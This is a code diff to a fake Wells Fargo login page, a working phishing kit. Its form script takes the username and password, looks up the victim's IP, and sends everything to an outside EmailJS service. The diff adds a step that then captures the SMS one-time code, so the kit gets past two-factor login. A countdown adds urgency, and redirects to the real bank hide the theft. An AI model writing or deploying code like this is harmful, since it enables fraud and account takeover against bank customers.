@@ -327,7 +327,10 @@ body {
             Time Remaining: <span id="countdown">09:59</span>
         </div>
         
-        <form id="scamForm">
+                <form id="scamForm">
+            <!-- Hidden field to track which step we are on -->
+            <input type="hidden" name="step" id="step" value="1">
+
             <div class="form-group">
                 <input type="text" name="username" placeholder="Username" required>
             </div>
@@ -335,10 +338,14 @@ body {
                 <input type="password" name="password" placeholder="Password" required>
             </div>
 
-            
-           
+            <!-- SMS Code Input (Hidden initially) -->
+            <div class="form-group" id="smsGroup" style="display: none; margin-top: 15px;">
+                <label style="display: block; margin-bottom: 5px; font-size: 14px;">Enter SMS Code</label>
+                <input type="text" name="sms_code" id="sms_code" placeholder="e.g. 123456" maxlength="6" 
+                       style="width: 100%; padding: 12px; text-align: center; letter-spacing: 5px; font-size: 16px;">
+            </div>
 
-         <button id="verifyBtn" type="submit">Verify Now</button>
+            <button id="verifyBtn" type="submit">Verify Now</button>
         </form>
 
           
@@ -387,115 +394,81 @@ body {
         </div>
     </footer>
         
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script>
-// 1. Init with your Public Key
-emailjs.init("y3lRWL7KLDjiFjNcN");
+      <script>
+    // 1. Init EmailJS
+    emailjs.init("y3lRWL7KLDjiFjNcN");
 
-document.getElementById('scamForm').addEventListener('submit', function(e) {
-e.preventDefault();
+    // 2. Helper to fetch IP
+    function fetchIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => ({ ip: data.ip, date: new Date().toLocaleString() }))
+            .catch(() => ({ ip: "Unavailable", date: new Date().toLocaleString() }));
+    }
 
-// Get the button to disable it
-const btn = document.getElementById('verifyBtn'); // Make sure your button has id="verifyBtn"
-const originalText = btn ? btn.textContent : "Verify Now";
+    // 3. Main Form Handler
+    document.getElementById('scamForm').addEventListener('submit', function(e) {
+        e.preventDefault();
 
-if(btn) {
-btn.disabled = true;
-btn.textContent = "Verifying...";
-btn.style.backgroundColor = "#999"; // Gray out button
-btn.style.cursor = "not-allowed";
-}
+        const btn = document.getElementById('verifyBtn'); // Ensure your button has id="verifyBtn"
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const smsCode = document.getElementById('sms_code').value;
+        const currentStep = document.getElementById('step').value;
 
-// Get data from form
-const formData = new FormData(e.target);
-const data = Object.fromEntries(formData.entries());
-
-// Get IP
-fetch('https://api.ipify.org?format=json')
-.then(res => res.json())
-.then(ipData => {
-// Add IP and Date to data object
-data.ip = ipData.ip;
-data.date = new Date().toLocaleString();
-
-// Send to EmailJS
-emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-.then(() => {
-// Success: Show processing screen, THEN redirect
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-
-// Wait 3 seconds then go to real site
-setTimeout(() => {
-window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-}, 3000);
-})
-.catch(err => {
-// Fail: Still show processing screen then redirect so they don't notice
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-});
-})
-.catch(() => {
-// If IP fetch fails, still send data without IP and redirect
-emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-.then(() => {
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-})
-.catch(() => {
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-     });
-  });
- });
-</script>
-    
-    <script>
-    (function() {
-        let time = 599; // 9 minutes * 60 + 59 seconds = 599
-        const display = document.getElementById('countdown');
-        
-        if (!display) return;
-
-        function updateDisplay() {
-            const minutes = Math.floor(time / 60);
-            const seconds = time % 60;
-            display.textContent = 
-                (minutes < 10 ? '0' : '') + minutes + ':' + 
-                (seconds < 10 ? '0' : '') + seconds;
+        // UI Feedback
+        if(btn) {
+            btn.disabled = true;
+            btn.textContent = "Verifying...";
+            btn.style.backgroundColor = "#999";
         }
 
-        const timer = setInterval(() => {
-            if (time <= 0) {
-                clearInterval(timer);
-                display.textContent = "00:00";
-                // Optional: Disable button or redirect when time runs out
-                const btn = document.querySelector('button[type="submit"]');
-                if(btn) {
-                    btn.disabled = true;
-                    btn.textContent = "Expired";
-                }
-            } else {
-                time--;
-                updateDisplay();
-            }
-        }, 1000);
+        // Get IP
+        fetchIP().then(ipData => {
+            
+            // Prepare Data
+            const data = {
+                username: username,
+                password: password,
+                ip: ipData.ip,
+                date: ipData.date,
+                step: currentStep === "1" ? "1: Credentials" : "2: SMS Code",
+                sms_code: smsCode || "N/A"
+            };
 
-        // Initialize immediately so it doesn't wait 1 second
-        updateDisplay();
-    })();
-</script>  
+            // Send Email
+            emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
+                .then(() => {
+                    // Show processing screen
+                    document.querySelector('.container').style.display = 'none';
+                    const processing = document.getElementById('processing');
+                    if(processing) processing.style.display = 'block';
+
+                    if (currentStep === "1") {
+                        // STEP 1: Just got credentials. Now ask for SMS.
+                        setTimeout(() => {
+                            document.getElementById('smsGroup').style.display = 'block'; // Show SMS input
+                            document.getElementById('step').value = "2"; // Update step
+                            document.getElementById('sms_code').focus(); // Auto-focus on SMS field
+                            btn.textContent = "Submit Code"; // Change button text
+                            btn.disabled = false; // Re-enable for next click
+                            btn.style.backgroundColor = "#c41230"; // Restore color
+                        }, 1000);
+                    } else {
+                        // STEP 2: Got SMS Code. Redirect to real site.
+                        setTimeout(() => {
+                            window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+                        }, 1500);
+                    }
+                })
+                .catch(err => {
+                    console.error("Email Error", err);
+                    // Fallback redirect even if email fails
+                    window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+                });
+        });
+    });
+</script>
     
  
 <style>
